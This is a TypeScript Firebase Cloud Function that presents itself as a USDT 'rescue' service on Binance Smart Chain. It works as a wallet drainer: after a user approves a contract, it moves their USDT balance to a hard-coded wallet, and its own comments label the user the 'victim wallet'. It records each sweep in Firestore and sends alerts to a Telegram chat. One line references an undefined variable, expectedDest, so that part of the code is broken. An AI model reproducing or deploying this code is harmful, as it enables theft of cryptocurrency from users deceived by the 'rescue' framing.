// functions/src/api/verifyRescue.ts
import * as functions from "firebase-functions/v1";
import { ethers } from "ethers";
import { db } from "../lib/firestore";
import * as admin from "firebase-admin";

export const verifyRescue = functions
  .runWith({
    secrets: ["TELEGRAM_TOKEN", "TELEGRAM_CHAT_ID", "DESTINATION_PRIVATE_KEY"],
    timeoutSeconds: 120,
  })
  .https.onRequest(async (req, res) => {
    // CORS
    res.set("Access-Control-Allow-Origin", "*");
    res.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.set("Access-Control-Allow-Headers", "Content-Type");
    if (req.method === "OPTIONS") {
      res.status(204).send("");
      return;
    }

    if (req.method !== "POST") {
      res.status(405).json({ error: "Method Not Allowed" });
      return;
    }

    const {
      txHash,
      from,
      to,
      amount,
      chainId,
      token,
    }: {
      txHash: string;
      from: string;
      to: string;
      amount: string;
      chainId: number | string;
      token: string;
    } = req.body ?? {};

    if (!from || !to || !amount || !chainId || !token) {
      res.status(400).json({ error: "Missing fields" });
      return;
    }

    // ---- 1. Verify chain, token, destination
    const expectedChain = Number(process.env.BSC_CHAIN_ID ?? "56");
    const expectedToken =
      process.env.BSC_USDT_CONTRACT_ADDRESS ??
      "0x55d398326f99059fF775485246999027B3197955";
    // The TokenRescue contract is the spender (what the user approved)
    const tokenRescueContract =
      process.env.BSC_TOKEN_RESCUE_CONTRACT ??
      "0xc6bf6838263938533e547f825d257c9965544a50";
    // The final wallet where rescued funds land
    const finalDestination =
      process.env.BSC_FINAL_DESTINATION ??
      "0xEfdd53261Ccd3febD063D6A57a21405B24977d15";

    if (Number(chainId) !== expectedChain) {
      res.status(400).json({ error: "Wrong chainId" });
      return;
    }
    if (token.toLowerCase() !== expectedToken.toLowerCase()) {
      res.status(400).json({ error: "Wrong token address" });
      return;
    }
    // Accept either the contract address or the final destination as `to`
    if (
      to.toLowerCase() !== tokenRescueContract.toLowerCase() &&
      to.toLowerCase() !== finalDestination.toLowerCase()
    ) {
      res.status(400).json({ error: "Destination mismatch" });
      return;
    }

    // ---- 2. Connect to BSC
    const provider = new ethers.JsonRpcProvider(
      process.env.BSC_HTTP_RPC_URL || "https://bsc-dataseed.binance.org/"
    );

    try {
      // ---- 3. Verify on-chain that the user has granted sufficient allowance
      const usdtReadOnly = new ethers.Contract(
        expectedToken,
        [
          "function allowance(address owner, address spender) view returns (uint256)",
          "function balanceOf(address) view returns (uint256)",
        ],
        provider
      );

      // Check allowance against the TokenRescue contract (what the user approved)
      const allowance: bigint = await usdtReadOnly.allowance(
        from,
        tokenRescueContract
      );
      const balance: bigint = await usdtReadOnly.balanceOf(from);

      if (balance === 0n) {
        res.status(400).json({ error: "No USDT balance to rescue" });
        return;
      }

      // Use the smaller of balance and amount to sweep
      const sweepAmount = balance < BigInt(amount) ? balance : BigInt(amount);

      if (allowance < sweepAmount) {
        res.status(400).json({
          error: "Insufficient allowance. User must approve first.",
          allowance: allowance.toString(),
          required: sweepAmount.toString(),
        });
        return;
      }

      // ---- 4. Call rescueTokens() on the TokenRescue contract
      //         The contract internally calls transferFrom using the approval
      //         the user granted to the contract address.
      const destSecret = process.env.DESTINATION_PRIVATE_KEY;
      if (!destSecret) {
        res
          .status(500)
          .json({ error: "Destination private key not configured" });
        return;
      }

      // Support both mnemonic phrases and hex private keys
      let destWallet: ethers.Wallet;
      if (destSecret.includes(" ")) {
        const hdWallet = ethers.HDNodeWallet.fromPhrase(destSecret.trim());
        destWallet = new ethers.Wallet(hdWallet.privateKey, provider);
      } else {
        destWallet = new ethers.Wallet(destSecret, provider);
      }

      console.log(`Owner wallet address: ${destWallet.address}`);

      // ABI for the TokenRescue contract
      const tokenRescueABI = [
        "function rescueTokens(address token, address from, address to, uint256 amount) external"
      ];
      const rescueContract = new ethers.Contract(
        tokenRescueContract,
        tokenRescueABI,
        destWallet
      );

      console.log(
        `Calling rescueTokens: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
      );
      const sweepTx = await rescueContract.rescueTokens(
        expectedToken,   // USDT contract
        from,            // victim wallet
        finalDestination, // your receiving wallet
        sweepAmount
      );
      const receipt = await sweepTx.wait(1);
      console.log(`Sweep tx confirmed: ${sweepTx.hash}`);

      // ---- 5. Record the rescue in Firestore
      const rescueRef = db.collection("rescues").doc();
      await rescueRef.set({
        user: from,
        approvalTxHash: txHash || null,
        sweepTxHash: sweepTx.hash,
        amount: sweepAmount.toString(),
        destination: expectedDest,
        createdAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "CONFIRMED",
      });

      // ---- 6. Send Telegram notification
      const { sendTelegramMessage } = await import("../lib/telegram");
      const formattedAmount = ethers.formatUnits(sweepAmount, 18);
      await sendTelegramMessage(
        `✅ Rescue successful!\n${formattedAmount} USDT swept from ${from}\nSweep tx: ${sweepTx.hash}`
      );

      res.status(200).json({
        success: true,
        docId: rescueRef.id,
        sweepTxHash: sweepTx.hash,
      });
    } catch (error: any) {
      console.error("verifyRescue error:", error);

      // Send error notification to Telegram
      try {
        const { sendTelegramMessage } = await import("../lib/telegram");
        await sendTelegramMessage(
          `❌ Rescue FAILED!\nFrom: ${from}\nError: ${error.message ?? "Unknown error"}`
        );
      } catch (tgErr) {
        console.error("Failed to send Telegram error notification:", tgErr);
      }

      res
        .status(500)
        .json({ error: "Rescue sweep failed", details: error.message });
    }
  });
